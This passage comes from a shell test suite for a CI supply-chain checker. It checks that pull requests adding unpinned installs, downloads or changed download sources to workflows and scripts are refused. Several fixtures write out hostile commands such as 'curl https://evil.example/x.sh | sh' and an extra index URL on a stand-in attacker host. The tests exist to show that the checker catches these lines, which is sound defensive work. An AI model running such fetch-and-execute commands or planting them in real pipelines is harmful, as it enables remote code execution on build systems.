check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
now = dt.datetime(2026, 10, 5, tzinfo=dt.timezone.utc)
for v in (">=2.0", "(unpinned)", "latest", "${{expression}}"):
    ok, why, _ = ac.judge_item(inv.Item("package", "pypi/p", v), [("2020-01-01T00:00:00Z", "pypi"), ("2020-01-01T00:00:00Z", "pr-clock")], now)
    assert not ok and "not a pin" in why, (v, why)
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
runck unm1 '{"times": {}}'
CASE="a PR that adds npm install to a workflow is refused (exit 1, unmeasured named), though nothing in the inventory moved"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/unm1.out"; check grep -qi 'not measurable' "$work/unm1.out"
newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
runck unm2 '{"times": {}}'
CASE="the same in a shell script outside .github (tools/fetch.sh) is refused too"
check test "$rc" -eq 1; check grep -q 'unmeasured:tools/fetch.sh' "$work/unm2.out"
newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
git -C "$work/unm3" commit -q --amend -m head
git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"
CASE="an unmeasured form already in the base (count unchanged by the head) is not refused: only an ADDED one is"
rc=0; python3 "$chk" --root "$work/unm3" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/unm3.out" 2>&1 || rc=$?
check test "$rc" -eq 0

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY
rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
python3 - "$work/swap2" <<'PY'
import pathlib, subprocess, sys
root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
g("add", "-A"); g("commit", "-q", "-m", "base2")
f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
g("add", "-A"); g("commit", "-q", "-m", "head")
PY
runck swap2 '{"times": {}}'
CASE="an in-place SWAP of one unmeasured command for another (localhost curl -> evil download) is an addition: refused, though the count did not change"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/swap2.out"
newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
runck cont '{"times": {}}'
CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
check test "$rc" -eq 1; check grep -q 'a download' "$work/cont.out"; check grep -q 'a system package install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
runck scanner '{"times": {}}'
CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
check test "$rc" -eq 1; check grep -q 'unmeasured:bin/install-scanner.sh' "$work/scanner.out"

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1", "action:local:./tools/act@(local)"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY
CASE="a CHANGED download source or a new local action is refused (a placeholder is never a pin)"
newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
runck srcswap '{"times": {}}'
check test "$rc" -eq 1; check grep -q 'not a pin' "$work/srcswap.out"

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
    try:
        fn()
    except RuntimeError as e:
        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
assert time.time() - t < 3, time.time() - t
# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
try:
    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
except RuntimeError:
    pass
else:
    raise AssertionError("an overlong pip install was accepted")
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r/t.tgz@v${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
import importlib.util as u
spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = u.module_from_spec(spec); spec.loader.exec_module(ac)
for k in need:
    ok, why, _ = ac.judge_item(got[k], [("2020-01-01T00:00:00Z", "pr-clock")], __import__("datetime").datetime(2026, 10, 5, tzinfo=__import__("datetime").timezone.utc))
    assert not ok and "not a pin" in why, (k, why)
PY
newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
runck bigagent '{"times": {}}'
CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

CASE="a script's placeholder is identified by its own LINE: an edit elsewhere in the script moves nothing, an edit of that line does"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
base = "echo a\ndocker run --rm $IMG make\necho b\n"
a = set(inv.inventory({"bin/x.sh": base}))
assert a and a == set(inv.inventory({"bin/x.sh": base + "echo more\n"})) == set(inv.inventory({"bin/x.sh": "echo zero\n" + base}))
assert a != set(inv.inventory({"bin/x.sh": base.replace("$IMG", "$OTHER")}))
PY

CASE="round 15: a download keeps its EXACT tag, pip options may precede install and --requirement is a requirements file, *-version-file inputs are placeholders, a placeholder's identity covers the step's and the job's env, the real scanner download syntax is read and the rest of that script is scanned"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run, extra="": {".github/workflows/a.yml": "jobs:\n  j:\n" + extra + "    steps:\n      - run: " + run + "\n"}
g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x.tgz"))
it = [v for v in g.values() if v.name == "o/r"][0]
assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
b = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: evil/image:latest\n        run: docker run --rm \"$IMAGE\" true\n"})
assert [k for k in b if k not in a and "(variable)" in k], "changing the variable's value (env) must change the placeholder's key"
c = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: alpine@sha256:" + "a" * 64 + "\n"))
d = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: evil/x:latest\n"))
assert set(c) != set(d), "a job-level env value changes the identity too"
real = inv.inventory({"bin/install-scanner.sh": 'TRIVY_BASE="${TRIVY_BASE_URL:-https://github.com/aquasecurity/trivy/releases/download}"\ncurl -fsSL https://github.com/evil/evil/releases/download/v1/x.tgz -o x\n'})
assert any(k.startswith("tool:source:") and "aquasecurity/trivy" in k for k in real) and any(v.name == "evil/evil" for v in real.values()), sorted(real)
PY

CASE="round 15 (plain forms): an expression-valued installer input, a container or services image given by an expression, and a matrix or env value feeding them are step-identified placeholders (a change to the value is a changed key); each curl/wget invocation is judged on its own"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def wfi(env, ver="${{ env.LINT_V }}"):
    return {".github/workflows/a.yml": "env:\n  LINT_V: " + env + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + ver + "\n"}
a, b = set(inv.inventory(wfi("v1.61.0"))), set(inv.inventory(wfi("v9.9.9")))
assert a != b and any("golangci-lint@${{expression}}" in k for k in a), (a, b)
def wfm(m):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        py: " + m + "\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version: ${{ matrix.py }}\n"}
assert set(inv.inventory(wfm("['3.12']"))) != set(inv.inventory(wfm("['3.12', '3.13-dev']")))
def wfc(m, svc="postgres:${{ matrix.pg }}"):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        image: " + m + "\n    container: ${{ matrix.image }}\n    services:\n      db:\n        image: " + svc + "\n    steps:\n      - run: echo hi\n"}
c1 = inv.inventory(wfc("['node:20']"))
assert any(k.startswith("image:(expression)@") for k in c1) and len([k for k in c1 if k.startswith("image:(expression)")]) == 2, sorted(c1)
assert set(c1) != set(inv.inventory(wfc("['node:20', 'evil:latest']")))
um = inv.unmeasured({".github/workflows/a.yml": "x: wget https://example.com/a.tgz; curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
assert [k for k in um if k[1] == "a download"], "the non-release wget before a release curl must still be refused"
assert not inv.unmeasured({".github/workflows/a.yml": "x: curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
PY

CASE="round 15 (Codex): the exact download tag is the identity (v1.2.3 and 1.2.3 differ), an encoded-tag URL is refused not excused, requirements.in/-dev/.lock files are refused, an unversioned go install is a placeholder, an unresolved package NAME cannot pass the age judge, installer-input placeholders carry their step identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import datetime, importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
k1 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x")))
k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.3/x.tgz -o x")))
assert k1 != k2
assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
    assert inv.unmeasured(wf(ln)), ln
assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
it = [v for v in inv.inventory(wf('go install "$TOOL@v1.2.3"')).values() if v.kind == "gotool"][0]
ok, why, _ = ac.judge_item(it, [("2020-01-01T00:00:00Z", "pr-clock")], datetime.datetime(2026, 10, 5, tzinfo=datetime.timezone.utc))
assert not ok and "not a pin" in why, why
u = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: " + v + "\n"}
assert set(inv.inventory(u(".python-version"))) != set(inv.inventory(u(".python-version-new")))
PY

CASE="PR clock: a check suite of the introducing commit earlier than any workflow run (a non-Actions check) sets the clock; the observer reads completed runs including a failed one"
out=$(python3 - "$work/map.json" "$INTRO" "$HEADC" <<'PY'
import json, sys
json.dump({"repos/o/r/actions/runs?head_sha=" + sys.argv[2] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-09-20T00:00:00Z"}]},
           "repos/o/r/commits/" + sys.argv[2] + "/check-suites?per_page=100": {"check_suites": [{"created_at": "2026-09-10T00:00:00Z"}, {"created_at": "2026-09-15T00:00:00Z"}]}}, open(sys.argv[1], "w"))
PY
cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$stubpy" "$work/pc" "$BASEC" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[2], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[3], sys.argv[4], "HEAD"))
PY
)
case "$out" in *2026-09-10T00:00:00Z) ok "$CASE";; *) bad "$CASE ($out)";; esac
check python3 - "$here/../supply-chain/tag_observer.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("t", sys.argv[1]); t = importlib.util.module_from_spec(spec); spec.loader.exec_module(t)
ok = {"event": "schedule", "head_branch": "main", "path": ".github/workflows/supply-chain.yml"}
assert t.accept_run(dict(ok, conclusion="success")) and t.accept_run(dict(ok, conclusion="failure")) and not t.accept_run(dict(ok, conclusion="cancelled"))
PY

CASE="a download SOURCE is an item: url=/URL=/*_BASE_URL assignments in a script and *_BASE_URL/*_URL env at any level; retargeting one (an env override, a url template line) is a changed key and is refused"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
sh = lambda ln: {"bin/install-scanner.sh": "TRIVY_VER=0.74.0\n" + ln + "\ncurl -fsSL \"$url\" -o t\n"}
a = set(inv.inventory(sh('url="${TRIVY_BASE}/v${TRIVY_VER}/trivy.tgz"'))); b = set(inv.inventory(sh('url="https://evil.example/t.tgz"')))
assert a != b and [k for k in b if k not in a and "(source)" in k], (a, b)
envwf = lambda v: {".github/workflows/a.yml": "env:\n  TRIVY_BASE_URL: " + v + "\njobs:\n  j:\n    steps:\n      - run: bin/install-scanner.sh trivy\n"}
assert set(inv.inventory(envwf("https://github.com/aquasecurity/trivy/releases/download"))) != set(inv.inventory(envwf("https://evil.example/dl")))
assert [k for k in inv.inventory(envwf("https://x")) if k.startswith("tool:source:env:trivy_base_url=")]
PY

CASE="round 16 (Codex): go install of a variable and pip3.12 install are placeholders/items; a script placeholder's identity includes the assignments of the variables it references; every URL of a downloader segment is classified by host and path; the downloaded asset name is part of the identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
assert [k for k in inv.inventory(wf('go install "$TOOL"')) if "(variable)" in k]
assert inv.inventory(wf("pip3.12 install examplepkg==99.0.0")).get("package:pypi/examplepkg@99.0.0")
a = set(inv.inventory({"bin/x.sh": "TAG=v1.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"})); b = set(inv.inventory({"bin/x.sh": "TAG=v9.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"}))
assert a != b
assert inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz https://downloads.example/new-tool.tar.gz"))
assert inv.unmeasured(wf("curl -fLO https://mirror.example/github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
assert not inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
x = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/old.tgz -o x"))); y = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/new.tgz -o x")))
assert x != y
PY

CASE="an option chain of a thousand tokens before pip/docker is read in milliseconds (no regex backtracking), and docker global options with values (--context x) do not hide the subcommand"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
